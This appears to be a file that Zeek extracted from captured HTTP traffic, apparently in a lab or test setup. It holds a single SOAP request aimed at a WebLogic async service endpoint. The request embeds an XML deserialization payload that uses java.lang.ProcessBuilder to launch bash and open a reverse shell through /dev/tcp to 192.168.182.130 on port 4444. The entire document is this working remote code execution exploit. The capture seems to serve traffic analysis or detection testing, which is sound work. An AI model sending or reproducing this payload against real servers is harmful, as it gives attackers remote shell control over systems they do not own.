code/lihan_code/tcpdump/test_zeek/extract_files/extract-1721031694.788808-HTTP-Fsrs2X22vqLbdmo0la

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"xmlns:wsa="http://www.w3.org/2005/08/addressing"xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>QaPD2UHXvPb0HuEGkTEp</wsa:Action><wsa:RelatesTo>RaLGxoScfzAL6rpNMSZu</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>bash -c '0&lt;&amp;209-;exec 209&lt;&gt;/dev/tcp/192.168.182.130/4444;sh &lt;&amp;209 &gt;&amp;209 2&gt;&amp;209'</string></void></array><void method="start"/></void></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>